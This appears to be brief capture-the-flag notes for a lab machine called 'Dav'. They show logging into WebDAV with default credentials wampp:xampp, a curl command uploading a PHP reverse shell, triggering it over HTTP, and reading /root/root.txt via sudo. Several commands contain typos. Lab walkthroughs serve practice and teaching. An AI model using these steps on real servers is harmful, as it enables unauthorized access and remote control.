# Dav
```
Export IP = "10.10.237,170"
```

## SCAN
```
80, http
```

## Enumerate
```
1. webdav (default Credential =  wampp:xampp )

[File Upload]
2. curl --user "wampp:xampp" htttp://{{export ip}}/webdav --upload-file reverse-shell.php -v
```

## Gaining Access
```
1. access to http://{{export_ip}}/webdav/reverse-shell.php
```

## Privilige Escalte
```
1. sudo /bin/cat /root/root.txt
```